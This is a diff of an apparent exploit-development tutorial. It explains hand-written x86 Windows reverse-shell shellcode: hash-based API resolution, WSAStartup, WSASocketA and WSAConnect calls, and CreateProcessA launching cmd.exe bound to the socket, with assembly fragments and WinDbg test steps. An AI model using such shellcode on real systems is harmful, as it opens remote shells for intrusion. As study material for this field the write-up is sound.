@@ -486,14 +486,12 @@ Loading ws2_32.dll and its symbols:  
     "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage    
 ...    
 ```
-
 `resolve_symbols_kernel32:`    
 These modifications are repetitive and probably don't need deep explanations    
 1. `push` pre-generated hashes    
 2. `call` our `find_function` returning the address to eax    
 3. `mov` this function address to the stack for later    
 4. Repeat for each function    
-   
    
 Call to LoadLibraryA with ws2_32.dll:    
 ```    
@@ -506,7 +504,6 @@ Call to LoadLibraryA with ws2_32.dll:  
     "   push  esp                       ;"  #   Push ESP to have a pointer to the string    
     "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA    
 ```
-
 `load_ws2_32:`    
 1. `xor eax, eax`    
 2. `mov ax, 0x6c6c` : move "ll" (from "ws2_32.dll") into ax, the rest of the eax register will be 0 creating the string null terminator    
@@ -526,7 +523,6 @@ Finding WSAStartup symbol in ws2_32.dll:  
     "   mov   [ebp+0x1C], eax           ;"  #   Save WSAStartup address for later usage    
 ...    
 ``` 
-   
 `resolve_symbols_ws2_32:`    
 1. `mov ebx, eax` : move the ws2_32.dll address from LoadLibraryA into ebx (it returns a handle which is also the base address)  
 2. `push 0x3bfcedcb` : push pre-gen hash of WSAStartup    
@@ -547,12 +543,12 @@ int WSAStartup(
 ```  
   
 The nested structure of WSAData ([https://learn.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata](https://learn.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata)) needs space allocated on the stack for the syscall (which populates it), so we look into its prototype as well to determine how much space is needed.  
-> The docs show that some fields are no longer used, or of variable size depending on the version. Instead of coding our own socket and inspecting in WinDbg, we can use ReactOS docs  
+> The docs show that some fields are no longer used, or of variable size depending on the version. Instead of coding our own socket in C and inspecting in WinDbg, we can use ReactOS docs  
   
 Pertinent info:  
-- WSAStartup Version used is 2.2  
-- [https://doxygen.reactos.org/d0/d96/structWSAData.html#acedc22f14e73bf97545feb47197fac07](https://doxygen.reactos.org/d0/d96/structWSAData.html#acedc22f14e73bf97545feb47197fac07) has all fields for WSAData  
-- Max length szDescription is 257 bytes (256 + null term)  
+- https://doxygen.reactos.org/d0/d96/structWSAData.html has all fields for WSAData 
+- - We use WSAStartup Version 2.2
+- Max length szDescription is 257 bytes (256 + null term) 
 - Max length szSystemStatus is 129 bytes  
 - 2 (word) + 2 (word) + 2 (u_short) + 2 (u_short) + 4 (char*) + 257 + 129 = 398 bytes  
   
@@ -578,16 +574,16 @@ Call to WSAStartup:
 1. `mov eax, esp` : move our current stack pointer (where resolved symbols are stored) to eax  
 2. `mov cx, 0x590` : move in a large number to be subtracted from eax (to create an address high up on the stack)  
 3. `sub eax, ecx` : subtract  
-4. `push eax` : push in eax as the lpWSAData pointer. Because the API call writes to this, it needs to be far up the stack so it's data isn't corrupted by later calls  
+4. `push eax` : push in eax as the lpWSAData pointer. Because the API call writes to this (and were putting it on stack instead of heap), it needs to be far up the stack so it's data isn't corrupted by later calls
 5. `xor eax, eax` : zero out  
-6. `mov ax, 0x0202` : move the version, 2.2, to eax  
+6. `mov ax, 0x0202` : move the version, 2.2 (stored as 22), to eax  
 7. `push eax` : push in 2.2 as the version  
 8. `call dword ptr [ebp+0x1C]` : Call WSAStartup  
   
 Test this by setting a breakpoint in `call_wsastartup` and stepping through the argument pushes, use `dd esp L2` to ensure they were pushed correctly. Then, step over the call to `WSAStartup` and ensure that the return value in eax is a `0` return code, signifying a successful call.  
   
 ### Calling WSASocketA  
-Creates a socket.  
+Creates a socket.
 Docs: [https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa)  
   
 Prototype:  
@@ -601,7 +597,6 @@ SOCKET WSAAPI WSASocketA(
   DWORD               dwFlags  
 );  
 ```  
-  
 - af, type, and protocol are all standard types listed in the docs  
 - WSAProtocolInfo is a nested struct. But if set to NULL, Winsock will just use a default which matches the previous parameters  
 - g can be set to NULL as well since we are creating a stand alone socket  
@@ -622,9 +617,8 @@ Argument push and call to WSASocketA:
     "   push  eax                       ;"  #   Push af  
     "   call dword ptr [ebp+0x20]       ;"  #   Call WSASocketA  
 ```  
-  
 I'm not going to break down this one, it's much simpler than the last one and any specific questions about values can be found in the docs. We push the values to stack in reverse order.  
-> Remember to add into `resolve_symbols_ws2_32` a call to `find_function` with the pre-gen hash of WSASocketA and save the returned address to stack.  
+> Remember to add into `resolve_symbols_ws2_32` a call to `find_function` with the pre-gen hash of WSASocketA and save the returned address to stack.  Also do this for the following function calls.
 ```  
 "   push 0xadf509d9     ;" #  
 "   call dword ptr [ebp+0x04];" #  
@@ -650,8 +644,17 @@ int WSAAPI WSAConnect(
 );  
 ```  
 - s refers to an unconnected socket descriptor, like the one we just made  
-- *name is a pointer to another structure, sockaddr_in: we pass in 2(AF_INET) to sin_family, then specify a port, and address (stored as yet another simple structure which can be pushed as a single DWORD)  
-- namelen = 0x10 = 2 (family) + 2 (port) + 4 (address) + 8 (sin_zero)  
+- \*name is a pointer to another structure, sockaddr_in: we pass in 2 (AF_INET) to sin_family, a port number, address (stored as yet another substructure which can be pushed as a single DWORD), and a zero char array  
+```
+struct sockaddr_in {
+        short   sin_family;
+        u_short sin_port;
+        struct  in_addr sin_addr;
+        char    sin_zero[8];
+};
+```
+- in_addr: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr
+- namelen = 0x10 = 2 (family) + 2 (port) + 4 (ip addr) + 8 (sin_zero)  
 - lpCallerData and lpCalleeData are not supported in TCP/IP, set to NULL  
 - lpSQOS, not needed for our socket, lpGQOS, reserved for future use, set both to NULL  
   
@@ -660,7 +663,7 @@ int WSAAPI WSAConnect(
 Argument push and call to WSAConnectA:  
 ```
     " call_wsaconnect:                   "  #  
-    "   mov   esi, eax                  ;"  #   Move the SOCKET descriptor to ESI  
+    "   mov   esi, eax                  ;"  #   Move the SOCKET descriptor to ESI 
     "   xor   eax, eax                  ;"  #   Null EAX  
     "   push  eax                       ;"  #   Push sin_zero[]  
     "   push  eax                       ;"  #   Push sin_zero[]  
@@ -683,7 +686,7 @@ Argument push and call to WSAConnectA:
     "   call dword ptr [ebp+0x24]       ;"  #   Call WSAConnect  
 ```
   
-Test this by setting a breakpoint at the start of `call_wsaconnect` step through and check that the struct was pushed correctly `dds esp L7` and also ensure the sockaddr_in substructure was pushed with `dds XXXXXXXX L4`. Open up a netcat listener to test the connection (should just do an initial connect but not persist), and ensure that the return value from the call is 0 in eax.  
+Test this by setting a breakpoint at the start of `call_wsaconnect` step through and check that the struct was pushed correctly `dds esp L7` and also ensure the sockaddr_in substructure was pushed with `dds XXXXXXXX L4` (using address of \*name). Open up a netcat listener to test the connection (should just do an initial connect but not persist), and ensure that the return value from the call is 0 in eax.  
   
 ### Calling CreateProcessA  
 Create a process (cmd.exe in this case) to contain the socket connection.  
@@ -705,12 +708,12 @@ BOOL CreateProcessA(
 );  
 ```  
   
-- lpApplicationName (pointer to application name string) OR lpCommandLine (pointer to command line string) must be set. We'll use the command line option.  
+- lpApplicationName (pointer to application name string) **OR** lpCommandLine (pointer to command line string) must be set. We'll use the command line option.  
 - lpProcessAttributes and lpThreadAttributes, determine whether handles can be inherited by children, we set to no with NULL.  
-- bInheritHandles, determine whether if the inheritable handles of the caller (Python) are inheried by the new process (cmd.exe), should be set to 1 (TRUE).  
-- dwCreationFlags, set as NULL to use the same Process Creation Flags as the calling process.  
+- bInheritHandles, determine whether the inheritable handles of the caller (Python) are inherited by the new process (cmd.exe), should be set to 1 (TRUE).  
+- dwCreationFlags, set as NULL to use the same Process Creation Flags as the calling process.
 - lpEnvironment, ditto, set NULL for calling proc's environment block.  
-- lpCurrentDirectory, NULL to use calling proc's current path (but may be needed if shellcode proc path doesn't have cmd.exe)  
+- lpCurrentDirectory, NULL to use calling proc's current path (but may be needed if shellcode process path doesn't have cmd.exe)  
 - lpStartupInfo, pointer to STARTUPINFOA, prototype below.  
 - lpProcessInformation, pointer to PROCESS_INFORMATION, this is populated by the API call so we just need its size.  
   
@@ -791,7 +794,7 @@ Structure creation / stack pushes for STARTUPINFOA:
     "   push  esp                       ;"  #   Push pointer to the "cmd.exe" string  
     "   pop   ebx                       ;"  #   Store pointer to the "cmd.exe" string in EBX  
 ```  
-1. `mov eax, 0xff9a879b`, `neg eax` : move in the an inverted hex string for \0\0exe for (avoiding null bytes terminating cmd.exe) and then negate it back  
+1. `mov eax, 0xff9a879b`, `neg eax` : move in the an inverted hex string for \\0exe for (avoiding null bytes terminating cmd.exe) and then negate it back  
 2. `push 0x2e646d63` : push the first half of the cmd.exe string (.dmc)  
 3. `push esp`, `pop ebx` : store a pointer to this pushed string in ebx  
   
